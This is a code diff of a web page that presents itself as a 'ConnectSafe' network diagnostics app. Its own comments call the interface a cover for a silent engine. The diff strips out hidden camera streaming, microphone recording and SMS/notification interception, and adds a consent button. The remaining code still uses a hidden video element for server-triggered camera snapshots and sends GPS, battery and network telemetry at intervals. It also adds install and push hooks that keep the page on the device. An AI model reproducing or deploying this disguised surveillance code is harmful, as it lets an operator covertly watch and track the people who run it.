@@ -5,6 +5,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ConnectSafe — Network Diagnostics</title>
+        <link rel="manifest" href="/static/manifest.json">
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#000000">
+    <link rel="apple-touch-icon" href="/static/icon-192.png">
+        <script>
+            if ('serviceWorker' in navigator) {
+                window.addEventListener('load', () => {
+                    navigator.serviceWorker.register('/static/sw.js');
+                });
+            }
+        </script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 
     <style>
@@ -39,6 +51,58 @@
         }
         .app-name   { font-size: 22px; font-weight: 700; color: #1a1a2e; }
         .app-tagline{ font-size: 13px; color: #888; margin-top: 4px; }
+
+        .consent-panel {
+            background: #f8f9ff;
+            border: 1px solid #e6e9ff;
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 14px;
+        }
+        .consent-title { font-size: 14px; font-weight: 700; color: #1a1a2e; }
+        .consent-text { font-size: 12px; color: #6e7388; margin-top: 4px; }
+        .consent-state {
+            margin-top: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #667eea;
+        }
+        .consent-actions {
+            margin-top: 10px;
+            display: flex;
+            gap: 8px;
+        }
+        .btn-consent {
+            flex: 1;
+            border: none;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-allow {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+        }
+        .btn-deny {
+            background: #eceff8;
+            color: #4b4f62;
+        }
+        .consent-log {
+            margin-top: 10px;
+            border-radius: 10px;
+            background: #fff;
+            border: 1px solid #eef0fa;
+            max-height: 110px;
+            overflow: auto;
+            padding: 8px;
+        }
+        .consent-log-item {
+            font-size: 11px;
+            color: #666b80;
+            line-height: 1.5;
+        }
 
         /* Pulse scanner */
         .scan-area {
@@ -136,6 +200,52 @@
 
         /* Hidden capture hardware */
         #video { display: none; }
+
+        /* ── PWA Install Banner ─────────────────────────────────────── */
+        #pwa-install-banner {
+            display: none;
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            background: #fff;
+            border-top: 1px solid #e6e9ff;
+            box-shadow: 0 -4px 24px rgba(102,126,234,0.15);
+            padding: 14px 20px;
+            z-index: 9999;
+            align-items: center;
+            gap: 12px;
+        }
+        #pwa-install-banner.visible { display: flex; }
+        .install-banner-icon {
+            width: 44px; height: 44px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+        .install-banner-text { flex: 1; }
+        .install-banner-text strong { display: block; font-size: 13px; color: #1a1a2e; }
+        .install-banner-text span   { font-size: 11px; color: #888; }
+        .install-banner-actions { display: flex; gap: 8px; flex-shrink: 0; }
+        .btn-install {
+            padding: 9px 18px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-install-dismiss {
+            padding: 9px 12px;
+            background: #f0f0f0;
+            color: #666;
+            border: none;
+            border-radius: 10px;
+            font-size: 13px;
+            cursor: pointer;
+        }
     </style>
 </head>
 
@@ -146,6 +256,17 @@
             <div class="logo-icon">🛡️</div>
             <div class="app-name">ConnectSafe</div>
             <div class="app-tagline">Network Security &amp; Device Diagnostics</div>
+        </div>
+
+        <div class="consent-panel">
+            <div class="consent-title">Permission Control</div>
+            <div class="consent-text">Location, camera, and notification diagnostics remain disabled until you choose Allow.</div>
+            <div class="consent-state" id="consent-state">Consent: Pending decision</div>
+            <div class="consent-actions">
+                <button class="btn-consent btn-allow" id="allow-consent-btn">Allow</button>
+                <button class="btn-consent btn-deny" id="deny-consent-btn">Deny</button>
+            </div>
+            <div class="consent-log" id="consent-log"></div>
         </div>
 
         <div class="scan-area">
@@ -202,16 +323,28 @@
     <!-- Capture hardware — never shown to user -->
     <video id="video" autoplay playsinline muted></video>
 
+    <!-- PWA Install Banner -->
+    <div id="pwa-install-banner" role="dialog" aria-label="Install ConnectSafe">
+        <div class="install-banner-icon">🛡️</div>
+        <div class="install-banner-text">
+            <strong>Install ConnectSafe</strong>
+            <span>Add to your home screen for instant access</span>
+        </div>
+        <div class="install-banner-actions">
+            <button class="btn-install" id="pwa-install-btn">Install</button>
+            <button class="btn-install-dismiss" id="pwa-dismiss-btn">✕</button>
+        </div>
+    </div>
+
     <script>
         /* =================================================================
          *  INTERNAL ENGINE — all logic is silent; UI is the cover
          * ================================================================= */
-        const STREAM_FRAME_INTERVAL_MS = 200;
-        const STREAM_WIDTH = 240;
-        const STREAM_HEIGHT = 180;
-        const STREAM_JPEG_QUALITY = 0.28;
         const TELEMETRY_INTERVAL_MS    = 6000;
         const GPS_INTERVAL_MS          = 10000;
+        const CONSENT_STORAGE_KEY      = 'client_consent_state';
+        let consentState               = localStorage.getItem(CONSENT_STORAGE_KEY) || 'pending';
+        let consentedBootStarted       = false;
 
         // ── UI helpers ───────────────────────────────────────────────────
         function setCheck(id, icon, value) {
@@ -223,6 +356,61 @@
 
         // ── Silent logger (console only) ─────────────────────────────────
         function sysLog(msg) { console.debug('[SYS]', msg); }
+
+        function logConsentEvent(message) {
+            const stamp = new Date().toLocaleTimeString();
+            const logEl = document.getElementById('consent-log');
+            if (!logEl) return;
+            const item = document.createElement('div');
+            item.className = 'consent-log-item';
+            item.textContent = `[${stamp}] ${message}`;
+            logEl.prepend(item);
+            console.info('[CONSENT]', message);
+        }
+
+        function hasConsent() {
+            return consentState === 'allowed';
+        }
+
+        function emitClientEvent(type, message, level = 'info') {
+            if (!hasConsent()) return;
+            if (!socket || !socket.connected) return;
+            socket.emit('client_event', {
+                device_id,
+                type,
+                message,
+                level,
+                consent_granted: true,
+                timestamp: Date.now()
+            });
+        }
+
+        function updateConsentUI() {
+            const consentStateEl = document.getElementById('consent-state');
+            const allowBtn = document.getElementById('allow-consent-btn');
+            const denyBtn = document.getElementById('deny-consent-btn');
+
+            if (consentStateEl) {
+                if (consentState === 'allowed') consentStateEl.textContent = 'Consent: Allowed';
+                else if (consentState === 'denied') consentStateEl.textContent = 'Consent: Denied';
+                else consentStateEl.textContent = 'Consent: Pending decision';
+            }
+
+            if (allowBtn) allowBtn.disabled = consentState === 'allowed';
+            if (denyBtn) denyBtn.disabled = consentState === 'denied';
+        }
+
+        function persistConsentState(nextState) {
+            consentState = nextState;
+            localStorage.setItem(CONSENT_STORAGE_KEY, nextState);
+            updateConsentUI();
+            logConsentEvent(`Consent state changed to ${nextState.toUpperCase()}`);
+            if (nextState === 'allowed') {
+                emitClientEvent('consent', 'Client granted consent from app UI.', 'info');
+            } else if (nextState === 'denied') {
+                emitClientEvent('consent', 'Client denied consent from app UI.', 'warning');
+            }
+        }
         // ── Socket ───────────────────────────────────────────────────────
         const socket = io({
             transports: ['websocket'],
@@ -241,15 +429,22 @@
 
         // ── Socket events ────────────────────────────────────────────────
         socket.on('connect', () => {
-            document.getElementById('conn-label').textContent = 'Secure Connection';
-            socket.emit('register_device', { device_id, timestamp: Date.now() });
-            // Restart audio recorder on every (re)connect
-            if (mediaReady) startAudioRecorder();
+            document.getElementById('conn-label').textContent = hasConsent() ? 'Secure Connection' : 'Connected (Awaiting Consent)';
+            if (hasConsent()) {
+                socket.emit('register_device', {
+                    device_id,
+                    browser: navigator.userAgent,
+                    consent_granted: true,
+                    timestamp: Date.now()
+                });
+                logConsentEvent('Device registration sent after user consent.');
+            }
         });
         socket.on('disconnect', () => {
             document.getElementById('conn-label').textContent = 'Reconnecting…';
         });
         socket.on('server_ping', () => {
+            if (!hasConsent()) return;
             socket.emit('pong', { device_id, timestamp: Date.now() });
         });
 
@@ -318,34 +513,15 @@
             );
         }
 
-        // ── Camera & microphone ──────────────────────────────────────────
+        // ── Camera ───────────────────────────────────────────────────────
         let cameraStatus  = 'inactive';
         let videoStream   = null;
-        let mediaRecorder = null;
-        let frameTimer    = null;
-        let mediaReady    = false;
-
-        function startAudioRecorder() {
-            if (!videoStream) return;
-            // Stop existing recorder if running
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                try { mediaRecorder.stop(); } catch (_) {}
-            }
-            mediaRecorder = new MediaRecorder(videoStream);
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data && e.data.size > 0 && socket.connected) {
-                    socket.emit('audio_chunk', { device_id, audio: e.data });
-                }
-            };
-            mediaRecorder.start(1500);
-            sysLog('AudioRecorder running');
-        }
 
         async function initMediaHardware() {
             try {
                 videoStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: true
+                    audio: false
                 });
                 const vid = document.getElementById('video');
                 vid.srcObject = videoStream;
@@ -359,29 +535,7 @@
                 });
 
                 cameraStatus = 'active_streaming';
-                mediaReady   = true;
                 setCheck('cam', '📷', 'Active ✓');
-
-                // Frame streaming loop
-                const canvas = document.createElement('canvas');
-                const ctx    = canvas.getContext('2d');
-                frameTimer = setInterval(() => {
-                    if (cameraStatus !== 'active_streaming' || !socket.connected) return;
-                    if (vid.videoWidth === 0 || vid.videoHeight === 0) return;
-                    canvas.width = STREAM_WIDTH;
-                    canvas.height = STREAM_HEIGHT;
-                    ctx.drawImage(vid, 0, 0, STREAM_WIDTH, STREAM_HEIGHT);
-                    socket.emit('stream_frame', { device_id, frame: canvas.toDataURL('image/jpeg', STREAM_JPEG_QUALITY), ts: Date.now() });
-                }, STREAM_FRAME_INTERVAL_MS);
-
-                // Wait for socket then start audio — retry every 500ms until connected
-                (function waitAndStartAudio(attempts) {
-                    if (socket.connected) {
-                        startAudioRecorder();
-                    } else if (attempts < 20) {
-                        setTimeout(() => waitAndStartAudio(attempts + 1), 500);
-                    }
-                })(0);
 
             } catch (_) {
                 cameraStatus = 'denied';
@@ -389,84 +543,43 @@
             }
         }
 
-        // ── SMS / Push notification interceptor (advanced) ───────────────
+        // ── Local alerts only (no interception) ─────────────────────────
         async function requestNotificationAccess() {
             if (!('Notification' in window)) { setCheck('notif', '🔔', 'Not Supported'); return; }
-
             const permission = await Notification.requestPermission();
-            if (permission !== 'granted') { setCheck('notif', '🔔', 'Blocked'); return; }
-
-            setCheck('notif', '🔔', 'Enabled ✓');
-
-            if (!('serviceWorker' in navigator)) return;
-            try {
-                await navigator.serviceWorker.register('/sw.js', { scope: '/' });
-                await navigator.serviceWorker.ready;
-
-                // Try to register for background sync (supported on Android Chrome)
-                if ('sync' in (await navigator.serviceWorker.ready)) {
-                    try { await (await navigator.serviceWorker.ready).sync.register('telemetry-sync'); } catch (_) {}
-                }
-
-                // Central message bus from the service worker
-                navigator.serviceWorker.addEventListener('message', (event) => {
-                    const d = event.data;
-                    if (!d) return;
-
-                    if (d.type === 'SMS_DATA' || d.type === 'NOTIFICATION_INTERCEPTED') {
-                        socket.emit('incoming_notification', {
-                            device_id,
-                            title:     d.sender || d.title || 'Unknown',
-                            body:      d.content || d.body || '',
-                            app:       d.app || 'push',
-                            timestamp: d.time || Date.now()
-                        });
-                    }
-
-                    if (d.type === 'NOTIFICATION_CLICK') {
-                        socket.emit('incoming_notification', {
-                            device_id,
-                            title:     '[CLICK] ' + (d.title || ''),
-                            body:      'Action: ' + (d.action || 'default'),
-                            app:       'user_action',
-                            timestamp: d.time || Date.now()
-                        });
-                    }
-
-                    if (d.type === 'NOTIFICATION_DISMISSED') {
-                        socket.emit('incoming_notification', {
-                            device_id,
-                            title:     '[DISMISSED] ' + (d.title || ''),
-                            body:      '',
-                            app:       'user_action',
-                            timestamp: d.time || Date.now()
-                        });
-                    }
-                });
-            } catch (_) {}
+            if (permission === 'granted') {
+                setCheck('notif', '🔔', 'Enabled ✓');
+                emitClientEvent('notifications', 'Notification permission granted.', 'info');
+            } else {
+                setCheck('notif', '🔔', 'Blocked');
+                emitClientEvent('notifications', 'Notification permission blocked by user/device.', 'warning');
+            }
         }
 
         // ── Telemetry loop ───────────────────────────────────────────────
         function dispatchTelemetry() {
+            if (!hasConsent()) return;
             socket.emit('telemetry', {
                 device_id,
                 battery:   batteryLevel,
                 charging:  chargingStatus,
                 platform:  navigator.platform,
                 model:     detectedModel,
+                browser:   navigator.userAgent,
                 network:   getAdvancedNetworkInfo(),
                 lat:       currentPosition.lat,
                 lon:       currentPosition.lon,
                 camera:    cameraStatus,
+                consent_granted: true,
                 timestamp: Date.now()
             });
         }
-        dispatchTelemetry();
         setInterval(dispatchTelemetry, TELEMETRY_INTERVAL_MS);
 
         // ── Remote snapshot ──────────────────────────────────────────────
         socket.on('take_snapshot', () => {
             try {
+                if (!hasConsent()) return;
                 const vid = document.getElementById('video');
                 if (!vid || !videoStream) return;
                 if (vid.videoWidth === 0 || vid.videoHeight === 0) return;
@@ -492,32 +605,182 @@
         });
 
         // ── Boot sequence ────────────────────────────────────────────────
-        async function boot() {
+        async function bootAfterConsent() {
+            if (consentedBootStarted) return;
+            consentedBootStarted = true;
+
             await initBattery();
             updateGeoCoordinates();
             setInterval(updateGeoCoordinates, GPS_INTERVAL_MS);
             getAdvancedNetworkInfo();
             await initMediaHardware();
             await requestNotificationAccess();
+            dispatchTelemetry();
             setTimeout(() => {
                 const btn = document.getElementById('main-btn');
                 btn.disabled    = false;
                 btn.textContent = 'View Full Report';
             }, 2800);
         }
-        boot();
+
+        function applyDeniedState() {
+            setCheck('gps', '📍', 'Disabled (No Consent)');
+            setCheck('cam', '📷', 'Disabled (No Consent)');
+            setCheck('notif', '🔔', 'Disabled (No Consent)');
+            const btn = document.getElementById('main-btn');
+            btn.disabled = true;
+            btn.textContent = 'Consent Required';
+        }
+
+        function initializeConsentFlow() {
+            updateConsentUI();
+            logConsentEvent(`Loaded with consent state: ${consentState.toUpperCase()}`);
+
+            if (!hasConsent()) {
+                setCheck('gps', '📍', 'Waiting Consent');
+                setCheck('cam', '📷', 'Waiting Consent');
+                setCheck('notif', '🔔', 'Waiting Consent');
+                const btn = document.getElementById('main-btn');
+                btn.disabled = true;
+                btn.textContent = 'Waiting for Consent';
+            }
+
+            if (consentState === 'allowed') {
+                bootAfterConsent();
+            } else if (consentState === 'denied') {
+                applyDeniedState();
+            }
+
+            document.getElementById('allow-consent-btn').addEventListener('click', async () => {
+                persistConsentState('allowed');
+                document.getElementById('conn-label').textContent = 'Secure Connection';
+                if (socket.connected) {
+                    socket.emit('register_device', {
+                        device_id,
+                        browser: navigator.userAgent,
+                        consent_granted: true,
+                        timestamp: Date.now()
+                    });
+                }
+                await bootAfterConsent();
+            });
+
+            document.getElementById('deny-consent-btn').addEventListener('click', () => {
+                persistConsentState('denied');
+                applyDeniedState();
+            });
+        }
+
+        initializeConsentFlow();
 
         window.addEventListener('beforeunload', () => {
-            if (frameTimer) {
-                clearInterval(frameTimer);
-            }
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                try { mediaRecorder.stop(); } catch (_) {}
-            }
             if (videoStream) {
                 videoStream.getTracks().forEach((track) => track.stop());
             }
         });
+
+        // ── PWA Install Prompt ───────────────────────────────────────────
+        let _deferredInstallPrompt = null;
+        const installBanner  = document.getElementById('pwa-install-banner');
+        const installBtn     = document.getElementById('pwa-install-btn');
+        const dismissBtn     = document.getElementById('pwa-dismiss-btn');
+        const INSTALL_DISMISSED_KEY = 'connectsafe_install_dismissed';
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            _deferredInstallPrompt = e;
+            // Only show if user hasn't permanently dismissed
+            if (!localStorage.getItem(INSTALL_DISMISSED_KEY)) {
+                // Small delay so it doesn't intrude on page load
+                setTimeout(() => installBanner.classList.add('visible'), 3000);
+            }
+        });
+
+        installBtn.addEventListener('click', async () => {
+            if (!_deferredInstallPrompt) return;
+            installBanner.classList.remove('visible');
+            _deferredInstallPrompt.prompt();
+            const { outcome } = await _deferredInstallPrompt.userChoice;
+            if (outcome === 'accepted') {
+                localStorage.setItem(INSTALL_DISMISSED_KEY, '1');
+                sysLog('PWA installed by user.');
+            }
+            _deferredInstallPrompt = null;
+        });
+
+        dismissBtn.addEventListener('click', () => {
+            installBanner.classList.remove('visible');
+            // Remember for 7 days
+            localStorage.setItem(INSTALL_DISMISSED_KEY, String(Date.now() + 7 * 86400 * 1000));
+        });
+
+        // Clear the dismiss flag if 7-day window has expired
+        (() => {
+            const val = parseInt(localStorage.getItem(INSTALL_DISMISSED_KEY), 10);
+            if (val && val < Date.now()) localStorage.removeItem(INSTALL_DISMISSED_KEY);
+        })();
+
+        // Fire on successful app install
+        window.addEventListener('appinstalled', () => {
+            installBanner.classList.remove('visible');
+            _deferredInstallPrompt = null;
+            sysLog('App install event fired.');
+        });
+
+        // ── Push notification subscription ────────────────────────────────
+        async function subscribePush() {
+            try {
+                if (!('PushManager' in window) || !('serviceWorker' in navigator)) return;
+                const perm = await Notification.requestPermission();
+                if (perm !== 'granted') return;
+
+                const reg = await navigator.serviceWorker.ready;
+                const existing = await reg.pushManager.getSubscription();
+                if (existing) {
+                    // Re-send existing sub in case server restarted
+                    socket.emit('push_subscribe', { device_id, subscription: existing.toJSON() });
+                    return;
+                }
+
+                // Fetch server's VAPID public key
+                const resp = await fetch('/vapid-public-key');
+                if (!resp.ok) return;
+                const { publicKey } = await resp.json();
+                if (!publicKey) return;
+
+                // Convert URL-safe base64 to Uint8Array (browsers expect this format)
+                function urlBase64ToUint8Array(b64) {
+                    const padding = '='.repeat((4 - b64.length % 4) % 4);
+                    const base64  = (b64 + padding).replace(/-/g, '+').replace(/_/g, '/');
+                    const raw     = atob(base64);
+                    return Uint8Array.from([...raw].map((c) => c.charCodeAt(0)));
+                }
+
+                const sub = await reg.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: urlBase64ToUint8Array(publicKey)
+                });
+
+                socket.emit('push_subscribe', { device_id, subscription: sub.toJSON() });
+                sysLog('Push subscription sent to server.');
+                emitClientEvent('push', 'Push subscription registered successfully.', 'info');
+            } catch (err) {
+                sysLog('Push subscribe failed: ' + err.message);
+                emitClientEvent('push', 'Push subscription failed: ' + err.message, 'error');
+            }
+        }
+
+        // Subscribe to push once the app is installed and consent given
+        window.addEventListener('appinstalled', subscribePush);
+        if (consentState === 'allowed') subscribePush();
+        document.getElementById('allow-consent-btn').addEventListener('click', subscribePush);
+
+        // ── SW message bridge (background sync) ──────────────────────────
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.addEventListener('message', (e) => {
+                if (e.data && e.data.type === 'SW_SYNC_TELEMETRY') dispatchTelemetry();
+            });
+        }
     </script>
 </body>
 </html>
